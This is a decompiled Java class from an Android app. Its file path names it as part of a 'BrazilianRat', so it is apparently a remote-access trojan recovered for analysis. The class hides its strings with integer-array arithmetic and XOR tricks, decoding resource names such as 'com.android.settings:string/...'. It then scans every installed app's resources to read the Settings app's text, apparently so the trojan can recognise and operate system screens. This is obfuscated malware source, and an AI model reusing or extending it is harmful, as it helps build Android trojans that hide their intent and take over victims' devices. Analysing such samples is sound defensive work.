package com.irifix;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import java.util.Iterator;
import org.json.JSONObject;

public class l {
  public static String a = c();
  
  public static String b = d();
  
  public static String c = a();
  
  public static String d = b();
  
  public static String e = e();
  
  public static String f = f();
  
  private static JSONObject g;
  
  public static String a() {
    String str = "";
    for (byte b = 0; b < 48; b++) {
      (new int[48])[0] = 99;
      (new int[48])[1] = 110;
      (new int[48])[2] = 107;
      (new int[48])[3] = 43;
      (new int[48])[4] = 93;
      (new int[48])[5] = 105;
      (new int[48])[6] = 94;
      (new int[48])[7] = 107;
      (new int[48])[8] = 103;
      (new int[48])[9] = 96;
      (new int[48])[10] = 90;
      (new int[48])[11] = 35;
      (new int[48])[12] = 103;
      (new int[48])[13] = 88;
      (new int[48])[14] = 102;
      (new int[48])[15] = 101;
      (new int[48])[16] = 89;
      (new int[48])[17] = 93;
      (new int[48])[18] = 85;
      (new int[48])[19] = 96;
      (new int[48])[20] = 38;
      (new int[48])[21] = 94;
      (new int[48])[22] = 94;
      (new int[48])[23] = 91;
      (new int[48])[24] = 81;
      (new int[48])[25] = 85;
      (new int[48])[26] = 77;
      (new int[48])[27] = 20;
      (new int[48])[28] = 77;
      (new int[48])[29] = 81;
      (new int[48])[30] = 85;
      (new int[48])[31] = 85;
      (new int[48])[32] = 65;
      (new int[48])[33] = 75;
      (new int[48])[34] = 74;
      (new int[48])[35] = 60;
      (new int[48])[36] = 61;
      (new int[48])[37] = 75;
      (new int[48])[38] = 74;
      (new int[48])[39] = 69;
      (new int[48])[40] = 65;
      (new int[48])[41] = 58;
      (new int[48])[42] = 55;
      (new int[48])[43] = 73;
      (new int[48])[44] = 61;
      (new int[48])[45] = 66;
      (new int[48])[46] = 64;
      (new int[48])[47] = 68;
      int i = (new int[48])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i + b));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static String a(String paramString) {
    try {
      return g.getString(paramString);
    } catch (Exception exception) {
      return "";
    } 
  }
  
  public static void a(Context paramContext) {
    try {
      JSONObject jSONObject = new JSONObject();
      this();
      g = jSONObject;
      g.put(a, "");
      g.put(b, "");
      g.put(c, "");
      g.put(d, "");
      g.put(e, "");
      g.put(f, "");
      PackageManager packageManager = paramContext.getPackageManager();
      Iterator<ApplicationInfo> iterator = packageManager.getInstalledApplications(128).iterator();
      while (iterator.hasNext()) {
        Resources resources = packageManager.getResourcesForApplication(iterator.next());
        if (resources != null) {
          Iterator<String> iterator1 = g.keys();
          while (iterator1.hasNext()) {
            String str = iterator1.next();
            if (!g.getString(str).isEmpty())
              continue; 
            int i = resources.getIdentifier(str, null, null);
            if (i != 0)
              g.put(str, c(resources.getString(i))); 
          } 
        } 
      } 
    } catch (Exception exception) {}
  }
  
  public static String b() {
    String str = "";
    for (byte b = 0; b < 47; b++) {
      (new int[47])[0] = 25403;
      (new int[47])[1] = 25415;
      (new int[47])[2] = 25413;
      (new int[47])[3] = 25350;
      (new int[47])[4] = 25401;
      (new int[47])[5] = 25414;
      (new int[47])[6] = 25404;
      (new int[47])[7] = 25418;
      (new int[47])[8] = 25415;
      (new int[47])[9] = 25409;
      (new int[47])[10] = 25404;
      (new int[47])[11] = 25350;
      (new int[47])[12] = 25419;
      (new int[47])[13] = 25405;
      (new int[47])[14] = 25420;
      (new int[47])[15] = 25420;
      (new int[47])[16] = 25409;
      (new int[47])[17] = 25414;
      (new int[47])[18] = 25407;
      (new int[47])[19] = 25419;
      (new int[47])[20] = 25362;
      (new int[47])[21] = 25419;
      (new int[47])[22] = 25420;
      (new int[47])[23] = 25418;
      (new int[47])[24] = 25409;
      (new int[47])[25] = 25414;
      (new int[47])[26] = 25407;
      (new int[47])[27] = 25351;
      (new int[47])[28] = 25409;
      (new int[47])[29] = 25414;
      (new int[47])[30] = 25419;
      (new int[47])[31] = 25420;
      (new int[47])[32] = 25401;
      (new int[47])[33] = 25412;
      (new int[47])[34] = 25412;
      (new int[47])[35] = 25399;
      (new int[47])[36] = 25401;
      (new int[47])[37] = 25412;
      (new int[47])[38] = 25412;
      (new int[47])[39] = 25399;
      (new int[47])[40] = 25423;
      (new int[47])[41] = 25401;
      (new int[47])[42] = 25418;
      (new int[47])[43] = 25414;
      (new int[47])[44] = 25409;
      (new int[47])[45] = 25414;
      (new int[47])[46] = 25407;
      int i = (new int[47])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i + 40232));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  private static String b(String paramString) {
    return paramString.replace("?", "\\?").replace("[", "\\[").replace("]", "\\]");
  }
  
  private static String c() {
    String str = "";
    for (byte b = 0; b < 43; b++) {
      (new int[43])[0] = 99;
      (new int[43])[1] = 110;
      (new int[43])[2] = 111;
      (new int[43])[3] = 45;
      (new int[43])[4] = 101;
      (new int[43])[5] = 107;
      (new int[43])[6] = 98;
      (new int[43])[7] = 117;
      (new int[43])[8] = 103;
      (new int[43])[9] = 96;
      (new int[43])[10] = 110;
      (new int[43])[11] = 37;
      (new int[43])[12] = 124;
      (new int[43])[13] = 108;
      (new int[43])[14] = 109;
      (new int[43])[15] = 100;
      (new int[43])[16] = 113;
      (new int[43])[17] = 118;
      (new int[43])[18] = 119;
      (new int[43])[19] = 122;
      (new int[43])[20] = 122;
      (new int[43])[21] = 102;
      (new int[43])[22] = 98;
      (new int[43])[23] = 118;
      (new int[43])[24] = 116;
      (new int[43])[25] = 117;
      (new int[43])[26] = 127;
      (new int[43])[27] = 105;
      (new int[43])[28] = 38;
      (new int[43])[29] = 110;
      (new int[43])[30] = 106;
      (new int[43])[31] = 109;
      (new int[43])[32] = 73;
      (new int[43])[33] = 79;
      (new int[43])[34] = 69;
      (new int[43])[35] = 12;
      (new int[43])[36] = 77;
      (new int[43])[37] = 75;
      (new int[43])[38] = 85;
      (new int[43])[39] = 83;
      (new int[43])[40] = 73;
      (new int[43])[41] = 69;
      (new int[43])[42] = 70;
      int i = (new int[43])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & (i ^ b)));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  private static String c(String paramString) {
    return b(paramString.replaceAll("\\<.*?\\>", ""));
  }
  
  private static String d() {
    String str = "";
    for (byte b = 0; b < 62; b++) {
      (new int[62])[0] = 99;
      (new int[62])[1] = 110;
      (new int[62])[2] = 111;
      (new int[62])[3] = 45;
      (new int[62])[4] = 101;
      (new int[62])[5] = 107;
      (new int[62])[6] = 98;
      (new int[62])[7] = 117;
      (new int[62])[8] = 103;
      (new int[62])[9] = 96;
      (new int[62])[10] = 110;
      (new int[62])[11] = 37;
      (new int[62])[12] = 124;
      (new int[62])[13] = 108;
      (new int[62])[14] = 109;
      (new int[62])[15] = 100;
      (new int[62])[16] = 113;
      (new int[62])[17] = 118;
      (new int[62])[18] = 119;
      (new int[62])[19] = 122;
      (new int[62])[20] = 122;
      (new int[62])[21] = 102;
      (new int[62])[22] = 98;
      (new int[62])[23] = 118;
      (new int[62])[24] = 116;
      (new int[62])[25] = 117;
      (new int[62])[26] = 127;
      (new int[62])[27] = 105;
      (new int[62])[28] = 38;
      (new int[62])[29] = 110;
      (new int[62])[30] = 106;
      (new int[62])[31] = 109;
      (new int[62])[32] = 73;
      (new int[62])[33] = 79;
      (new int[62])[34] = 69;
      (new int[62])[35] = 12;
      (new int[62])[36] = 81;
      (new int[62])[37] = 75;
      (new int[62])[38] = 79;
      (new int[62])[39] = 73;
      (new int[62])[40] = 91;
      (new int[62])[41] = 93;
      (new int[62])[42] = 75;
      (new int[62])[43] = 71;
      (new int[62])[44] = 64;
      (new int[62])[45] = 114;
      (new int[62])[46] = 79;
      (new int[62])[47] = 95;
      (new int[62])[48] = 64;
      (new int[62])[49] = 93;
      (new int[62])[50] = 91;
      (new int[62])[51] = 80;
      (new int[62])[52] = 85;
      (new int[62])[53] = 65;
      (new int[62])[54] = 95;
      (new int[62])[55] = 88;
      (new int[62])[56] = 86;
      (new int[62])[57] = 102;
      (new int[62])[58] = 78;
      (new int[62])[59] = 94;
      (new int[62])[60] = 68;
      (new int[62])[61] = 73;
      int i = (new int[62])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & (i ^ b)));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  private static String e() {
    String str = "";
    for (byte b = 0; b < 46; b++) {
      (new int[46])[0] = 99;
      (new int[46])[1] = 110;
      (new int[46])[2] = 107;
      (new int[46])[3] = 43;
      (new int[46])[4] = 93;
      (new int[46])[5] = 105;
      (new int[46])[6] = 94;
      (new int[46])[7] = 107;
      (new int[46])[8] = 103;
      (new int[46])[9] = 96;
      (new int[46])[10] = 90;
      (new int[46])[11] = 35;
      (new int[46])[12] = 103;
      (new int[46])[13] = 88;
      (new int[46])[14] = 102;
      (new int[46])[15] = 101;
      (new int[46])[16] = 89;
      (new int[46])[17] = 93;
      (new int[46])[18] = 85;
      (new int[46])[19] = 96;
      (new int[46])[20] = 38;
      (new int[46])[21] = 94;
      (new int[46])[22] = 94;
      (new int[46])[23] = 91;
      (new int[46])[24] = 81;
      (new int[46])[25] = 85;
      (new int[46])[26] = 77;
      (new int[46])[27] = 20;
      (new int[46])[28] = 77;
      (new int[46])[29] = 81;
      (new int[46])[30] = 85;
      (new int[46])[31] = 85;
      (new int[46])[32] = 65;
      (new int[46])[33] = 75;
      (new int[46])[34] = 74;
      (new int[46])[35] = 60;
      (new int[46])[36] = 75;
      (new int[46])[37] = 79;
      (new int[46])[38] = 66;
      (new int[46])[39] = 62;
      (new int[46])[40] = 74;
      (new int[46])[41] = 54;
      (new int[46])[42] = 55;
      (new int[46])[43] = 69;
      (new int[46])[44] = 68;
      (new int[46])[45] = 70;
      int i = (new int[46])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i + b));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  private static String f() {
    String str = "";
    for (byte b = 0; b < 50; b++) {
      (new int[50])[0] = 5376;
      (new int[50])[1] = 5388;
      (new int[50])[2] = 5386;
      (new int[50])[3] = 5323;
      (new int[50])[4] = 5374;
      (new int[50])[5] = 5387;
      (new int[50])[6] = 5377;
      (new int[50])[7] = 5391;
      (new int[50])[8] = 5388;
      (new int[50])[9] = 5382;
      (new int[50])[10] = 5377;
      (new int[50])[11] = 5323;
      (new int[50])[12] = 5392;
      (new int[50])[13] = 5378;
      (new int[50])[14] = 5393;
      (new int[50])[15] = 5393;
      (new int[50])[16] = 5382;
      (new int[50])[17] = 5387;
      (new int[50])[18] = 5380;
      (new int[50])[19] = 5392;
      (new int[50])[20] = 5335;
      (new int[50])[21] = 5392;
      (new int[50])[22] = 5393;
      (new int[50])[23] = 5391;
      (new int[50])[24] = 5382;
      (new int[50])[25] = 5387;
      (new int[50])[26] = 5380;
      (new int[50])[27] = 5324;
      (new int[50])[28] = 5374;
      (new int[50])[29] = 5376;
      (new int[50])[30] = 5376;
      (new int[50])[31] = 5378;
      (new int[50])[32] = 5392;
      (new int[50])[33] = 5392;
      (new int[50])[34] = 5382;
      (new int[50])[35] = 5375;
      (new int[50])[36] = 5382;
      (new int[50])[37] = 5385;
      (new int[50])[38] = 5382;
      (new int[50])[39] = 5393;
      (new int[50])[40] = 5398;
      (new int[50])[41] = 5372;
      (new int[50])[42] = 5392;
      (new int[50])[43] = 5378;
      (new int[50])[44] = 5393;
      (new int[50])[45] = 5393;
      (new int[50])[46] = 5382;
      (new int[50])[47] = 5387;
      (new int[50])[48] = 5380;
      (new int[50])[49] = 5392;
      int i = (new int[50])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i + 60259));
      str = stringBuilder.toString();
    } 
    return str;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/l.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */